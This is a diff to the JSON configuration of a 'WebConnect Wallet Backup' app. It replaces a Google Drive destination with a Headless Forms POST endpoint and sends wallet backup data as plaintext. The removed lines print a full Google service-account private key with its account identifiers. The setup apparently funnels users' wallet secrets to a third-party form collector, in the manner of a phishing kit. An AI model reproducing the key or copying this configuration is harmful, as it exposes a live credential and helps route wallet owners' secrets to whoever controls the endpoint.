@@ -1,31 +1,21 @@
 {
   "version": "1.0.0",
   "app_name": "WebConnect Wallet Backup",
-  "description": "Interactive wallet backup system with Google Drive integration",
+  "description": "Interactive wallet backup system with Headless Forms integration",
   "repository": "https://github.com/decentralizedconfig/launchpad",
   
   "storage": {
     "enabled": true,
     "destinations": [
       {
-        "name": "google_drive",
-        "type": "google_drive",
+        "name": "headless_forms",
+        "type": "headless_forms",
         "enabled": true,
-        "folder_id": "1F9EDEuDwNfFtUWlppIOFfO4yEoKc9Je7",
-        "description": "Google Drive folder for secure backup storage",
-        "credentials": {
-          "type": "service_account",
-          "project_id": "my-command-488816",
-          "private_key_id": "0c02f76d0d5a10fef3ec2f7968805bcf1b20929e",
-          "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCtUol9tCN9viv8\ni8OjGEDwP0eML8KDvVn+EylU1AmAn1c78qAmYVMKSVNoEUOi047JYycvo5+Rmp6i\nEwjgGFSXCMPGEKwEgfVE+Irf8PotknAsNPJ19PrySAJv+JWx+JeLIzQtOwRZf1At\nnGq2Loo3rPOPUtSX6y1Ivn+rnj7fT4RXrqMC7UKy3hZ1ML9V69sS0UmibBvMJ9Yr\nW/aGQ2iShUxwl96yjNUpvMxQbXIN/+P2OOrYuxmBW1Bw6kR2EUj+EH7tkBAPVc1h\n/SF1wm/X7vv9QxY00wXoY1DDJWaBpEdkHkPh+JpY40RaqFvgxfSanqxioB05JEc5\nxN3w/hE5AgMBAAECggEAHNHE0V1O6nVg6IMP4nJht+D5w15cpF2rlVL31CZWtyen\nkG0BQqh7r5HuN7dpLO2rCCL/zMzS91nDp1TtbJ+3Dw8SyIAUrkIyt4dxRhfSbZn0\nI3GhYEo+IOOm3hnyQC/C+Qx/PEccK8p+2TqxRr451tSgAhSmi2U8OCSO44kyUJyo\npUN2kYVMB4lquXiT9bXx56WgToXhOJ1M3lXRjZyapikTAS/olPunYOnXlVdf8A77\ncxSI1CBm9whH/CbrV6mfGWNz+gROy3wWi6pegpVmIWjnmA5asWvLxbs2lamhhd6Z\nnZcVrRnTLawwNj9mWA7faNVUQk4b1+GXb7yBOiqWZQKBgQDl/E9h/3eLIVfVatzQ\nzOGQSfBLgs+tN9Nppj8CNarZoENQVcHKOh/eLP052Yl46STNWUCEaWFchBLmNrXc\nmG7NEjpw0amM8RnX7CBboanxs9p9OBRcnxW4D+dbn+KwmZqkHNGTmFtIFxT5p+yj\nV5NMfe01bTcjYvweX9qze8YFbQKBgQDA7W6cK1vK0v4TWchy3CJc7iMAOPdq0J82\nLG0AKxNDejaiWk1ocJji+212EeAMod2JhgxXXGeRLZO0+aIDsXhkRrDdQ3viuu+C\nPLO70+vvUCUImYYHGMLrh8Dz17vtAFrixHqOg2G6FKsz/RbYRNqk4IexhX2ZOys5\nRTpx/883fQKBgQCMSD2HkhMx61GvHPK57e68W01WUeEpUD8FV2FhkKi4/BdzHgwJ\ntTCRDbIcIkPHW7aWBxXiboDztJ/uinqdpuEW90JsZIbeMIZJ/X6zRcXqZ4EjFhzd\nbjAKSLEfY0Qb4mXAKs/vDmTHcUTbD4G5FIcFhl41U3vpesw8Hs3A4wOjdQKBgFwO\nLtQXoEIEMTW8hne/8CmVe1/0zqHKD94CjrQg2Z096GnJWtw1tc3AmLdYyiZc6d9f\n9e2NauGL9MnKv3KxsLdwP54kQC2scvIa0swRz6ct/629y4UBXKiT6w6u5r2siLFh\nfPUZXX0ztYkl/0uMdyNq+3RKNObzo6k9DiktHYvlAoGBANDezkN/jsZySc8ObCnz\nBfwVwCbO1JbBCEP3yCQJu9JyoQdBhyF2LTpRZ5YLl3EH9hA1FvsD5NbcjQdJQRTE\nNjDbuO14d9L+bY0uVD22YtF29cs2UBcmALWMT81t5iAWO01NGAT0euypbNY3Ep/w\nsYD0EM4UFvSOgW6X2tX8kceb\n-----END PRIVATE KEY-----\n",
-          "client_email": "maverick@my-command-488816.iam.gserviceaccount.com",
-          "client_id": "112079720866841048370",
-          "auth_uri": "https://accounts.google.com/o/oauth2/auth",
-          "token_uri": "https://oauth2.googleapis.com/token",
-          "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
-          "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/maverick%40my-command-488816.iam.gserviceaccount.com",
-          "universe_domain": "googleapis.com"
-        }
+        "endpoint": "https://api.headlessforms.cloud/api/v1/form/QrMTqYpVU8",
+        "method": "POST",
+        "description": "Headless Forms endpoint for secure backup submission",
+        "timeout": 30,
+        "retry_attempts": 3
       }
     ]
   },
@@ -81,10 +71,9 @@
     "data_format": "plaintext"
   },
 
-  "google_drive": {
-    "endpoint": "https://www.googleapis.com/drive/v3",
-    "upload_timeout": 60,
+  "form_submission": {
+    "endpoint_timeout": 30,
     "retry_attempts": 3,
-    "chunk_size": 262144
+    "content_type": "application/json"
   }
 }
